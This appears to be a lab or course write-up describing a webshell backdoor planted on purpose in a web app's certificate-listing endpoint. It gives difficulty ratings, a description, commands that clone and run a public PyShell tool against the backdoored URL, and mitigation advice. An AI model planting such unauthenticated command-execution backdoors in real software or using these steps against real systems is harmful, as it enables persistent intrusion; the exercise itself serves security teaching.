# Webshell backdoor

Difficulty: 
  * Blackbox approach: medium
  * Whitbox approach: simple

## Description
A webshell is a method of gaining persistence and easy access to a target system by the attacker.
A call to a specific URL will make the application run commands on the OS and return the result.
Webshells are widely used as of 2022. Ready-made kits are available.

In our case, we use an innocent-looking URL and parameter name. No authentication is performed,
but could easily be added (e.g. by checking for a certain parameter/password or `user-agent` string).

## How to exploit
Run the following commands on the client:
```
git clone https://github.com/ultinate/pyshell.git
python -m venv env
source env/bin/activate
pip install -r requirements.txt
python pyshell.py -p cert_id https://imovies.ch/list_certs GET
```

Replace `https://imovies.ch` by `http://localhost:5000` for local testing.

## How to mitigate
Remove the backdoor from code (`frontend/app/app.py`).

## Credits
https://github.com/JoelGMSec/PyShell

